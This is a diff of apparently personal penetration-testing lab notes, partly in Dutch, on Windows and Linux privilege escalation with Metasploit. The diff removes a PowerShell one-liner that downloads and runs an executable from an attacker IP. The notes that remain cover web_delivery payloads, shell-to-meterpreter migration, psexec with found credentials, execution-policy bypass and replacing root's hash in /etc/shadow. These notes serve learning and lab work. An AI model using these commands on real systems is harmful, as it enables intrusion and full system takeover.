@@ -5,11 +5,7 @@
 - PrivscCheck is a script that enumerate common Windows configuration issues that can be leveraged for local privilige escalation. It also gathers info that is usefull for exploitation or post exploitation: 
 	- https://github.com/itm4n/PrivescCheck 
 
---
-target: 10.2.20.115
-kali: 10.10.18.8
-
-powershell.exe -nop -w hidden -c [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$z="echo ($env:temp+'\eYgB4HEV.exe')"; (new-object System.Net.WebClient).DownloadFile('http://10.10.18.8:8080/9zF5sgNNB', $z); invoke-item $z
+----
 
 web_delivery module (`show info`)
 - set target to powershell:` set target PSH\ (Binary`) 
@@ -17,23 +13,22 @@ web_delivery module (`show info`)
 - `set PSH-EncodedCommand false ` (we do not want it to encrypt with base 64)
 - copy the powershell code provided 
   
-- paste the code in the CommandPromptSession on victim system 
-this will give you accesss to target system through command shell session. 
+- paste the code in the CMD session on victim system 
+this will give you access to target system through command shell session. 
   
 - migrate this session to meterpreter session: 
-	- search shell_to_meterpreter module 
+	- `search shell_to_meterpreter` module 
 	- set lhost kali 
 	- set lport (make sure its not the same as the existing shell session)
 	- set session to shell session 
 	- show advanced: 
-		- set WIN_TRANSFER VBS
+		-` set WIN_TRANSFER VBS`
 
 **powershell -ep bypass .\script.ps1** 
 Hiermee wordt het uitvoeringsbeleid tijdelijk omzeild voor de huidige sessie, zodat het script kan worden uitgevoerd zonder problemen met de uitvoeringsbeleidsinstellingen.**
 
 
-
-Privilege escalation: 
+**Privilege escalation:** 
 after migrating to a more stable process such as explorer you run getprivs to find out what the priviliges are (getprivs)
 
 In meterpreter: 
@@ -62,30 +57,6 @@ Method 2 is with meterpreter session
 - use exploit/windows/smb/psexec 
 - set lport that does not conflict with current sessions 
 - set smb-password and smb-username with found credentials 
-- 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 
 
@@ -109,14 +80,14 @@ Linux priviliges: LinEnum
 Simple bash script that automates common Linux local enumeration check in addition identifying privilege escalation vulnerabilities. 
 -> https://github.com/rebootuser/LinEnum 
 
-
+---
 
 ##### Weak permissions 
 CMD: 
 	``whoami` 
 	`cat /etc/passwd`
 	`cat /etc/group `
-	`groups student ``
+	`groups student
 
 find file that can be usefull in elevating privileges 
  
@@ -135,6 +106,7 @@ we have access to the password files but we can only see the hashes.
 so this means that we have to replace the password with a hashed password (this way we can have access to the root user)
 
 1. Confirm that you have access to the shadow file: `ls -al /etc/shadow `
+   `cat /etc/shadow`
 2. generate password you can replace: `openssl passwd -1 -salt abc youhavebeenhacked`
 3. copy hashed password and replace in shadow file: `vim` `/etc/shadow `
    remove the * and paste the new password 
